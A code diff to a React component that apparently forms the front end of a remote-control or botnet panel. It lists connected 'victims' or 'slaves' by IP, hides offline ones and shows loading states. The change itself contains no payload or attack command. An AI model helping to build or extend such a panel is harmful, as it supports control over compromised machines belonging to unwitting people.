@@ -17,10 +17,10 @@ export default class Body extends React.Component{
                 clientY: 0
             },
             ServerConstants : null,
-            ConnectedGuests : {}
+            ConnectedGuests : {},
+            RenderGuests    : false
         }
 
-        this.getVictims();
     }
 
     getVictims(){
@@ -33,7 +33,12 @@ export default class Body extends React.Component{
                 console.log("slaves:", slaves, "Constants:", ServerConstants);
                 let ConnectedGuests = this.state.ConnectedGuests;
                 ConnectedGuests = slaves;
-                this.setState({ConnectedGuests});
+                let RenderGuests = this.state.RenderGuests;
+                if(RenderGuests === false)
+                    RenderGuests = true;
+
+                this.setState({ConnectedGuests, RenderGuests});
+
             }
             // intial data pull
             this.ServerStore({
@@ -174,18 +179,36 @@ export default class Body extends React.Component{
         alert("clicked");
     }
 
+    componentDidMount(){
+        this.getVictims();
+    }
 
     render(){
         let currentOption = this.currentOption();
-        console.log("Constants:", this.state.ServerConstants);
-        let viewVictims = () => {
-            let re = [];
-            for (let ip in this.state.ConnectedGuests) {
-                re.push(<VicBox key={ip}
-                    ContextHandler={(event) => this.handleContext(event, 1)}
-                    Text={ip} Attributes={{}} info={this.state.ConnectedGuests[ip]} />);
+        let rend = () => {
+            let r = [<h3 key="noVics"> No Slaves Was Found :( </h3>];
+            if (Object.keys(this.state.ConnectedGuests).length > 0) {
+                r.splice(0, 1);
+                for (const ip in this.state.ConnectedGuests) {
+                    if (this.state.ConnectedGuests[ip].data != null) {
+                        if (this.state.ServerConstants.hideOfflineSlaves == true && this.state.ConnectedGuests[ip].status == 0)
+                            continue;
+
+                        r.push(<VicBox key={ip}
+                            ContextHandler={(event) => this.handleContext(event, 1)}
+                            Text={ip} Attributes={{}} info={this.state.ConnectedGuests[ip]} />);
+
+                    }else if(r.length == 0){
+                        r.push(
+                            <div key="loadingParent">
+                                <i className="fa fa-cog fa-spin fa-3x fa-fw" key="loadingIcon" />
+                                <span key="loadingText" style={{"fontSize" : "2em"}}> Loading Victim ...</span>
+                            </div>
+                        );
+                    }
+                }
             }
-            return re;
+            return r;
         }
         return(
             <div className="body" onClick={this.removeContext.bind(this)}>
@@ -195,7 +218,7 @@ export default class Body extends React.Component{
                     pos={{ clientX: this.state.ContextMenu.clientX, clientY: this.state.ContextMenu.clientY }} 
                         srcElm={this.ContextElement} options={currentOption} /> : null}
 
-                {Object.keys(this.state.ConnectedGuests).length > 0 ? viewVictims() : <h1>No Guests </h1>}
+                {this.state.RenderGuests ? rend() : `<i style="fa fa-cog fa-spin fa-fw"></i> <span> Loading Configuration ... </span>` }
                     
             </div>
         )
